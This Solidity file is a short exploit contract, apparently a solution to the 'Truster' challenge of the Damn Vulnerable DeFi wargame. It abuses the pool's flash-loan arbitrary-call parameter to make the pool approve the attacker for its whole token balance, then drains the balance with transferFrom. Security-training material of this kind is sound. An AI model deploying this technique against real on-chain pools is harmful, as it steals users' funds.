// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {TrusterLenderPool} from "./TrusterLenderPool.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";

contract TrusterLenderPoolAttack {
    TrusterLenderPool private immutable _TRUSTER_LENDER_POOL;

    constructor(address trusterLenderPool) {
        _TRUSTER_LENDER_POOL = TrusterLenderPool(trusterLenderPool);
    }

    function attack(address to) external {
        DamnValuableToken target = _TRUSTER_LENDER_POOL.token();
        uint256 amount = target.balanceOf(address(_TRUSTER_LENDER_POOL));
        assert(amount > 0);
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), amount);
        _TRUSTER_LENDER_POOL.flashLoan(0, address(this), address(target), data);
        target.transferFrom(address(_TRUSTER_LENDER_POOL), address(to), amount);
    }
}
